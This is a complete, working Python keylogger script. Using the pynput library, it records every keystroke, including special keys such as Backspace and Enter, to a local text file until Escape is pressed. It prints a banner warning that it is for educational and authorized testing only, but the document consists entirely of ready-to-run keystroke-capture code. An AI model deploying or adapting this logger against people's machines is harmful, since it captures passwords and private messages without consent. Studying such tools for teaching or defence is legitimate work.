import os
import sys
from pynput.keyboard import Key, Listener

# File to store the logged keys
log_file = "key_log.txt"

print("====================================================")
print("               SIMPLE KEYLOGGER                     ")
print("====================================================")
print("[WARNING] This program is for educational and authorized")
print("          testing purposes only. Monitoring keystrokes")
print("          without explicit consent is illegal.")
print("----------------------------------------------------")
print(f"[*] Keystrokes are being logged to: {os.path.abspath(log_file)}")
print("[*] Press 'Escape' key to stop logging.")
print("====================================================")

def write_to_file(key_str):
    """Appends keystrokes to the log file."""
    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(key_str)
            f.flush()
    except Exception as e:
        print(f"\n[ERROR] Failed to write to log file: {e}", file=sys.stderr)

def on_press(key):
    """Callback triggered on key press."""
    try:
        # Log character keys
        if key.char is not None:
            write_to_file(key.char)
    except AttributeError:
        # Handle special keys
        if key == Key.space:
            write_to_file(" ")
        elif key == Key.enter:
            write_to_file("\n")
        elif key == Key.tab:
            write_to_file("\t")
        elif key == Key.backspace:
            write_to_file("[BACKSPACE]")
        elif key in [Key.shift, Key.shift_r, Key.ctrl_l, Key.ctrl_r, Key.alt_l, Key.alt_r]:
            # Skip logging standalone modifier keys to keep log file clean
            pass
        else:
            write_to_file(f"[{key.name.upper()}]")

def on_release(key):
    """Callback triggered on key release. Exits if Escape is pressed."""
    if key == Key.esc:
        print("\n[INFO] Exiting keylogger cleanly.")
        return False

if __name__ == "__main__":
    try:
        # Start the listener
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("\n[INFO] Keylogger stopped by user interrupt.")
    except Exception as e:
        print(f"\n[ERROR] An unexpected error occurred: {e}", file=sys.stderr)
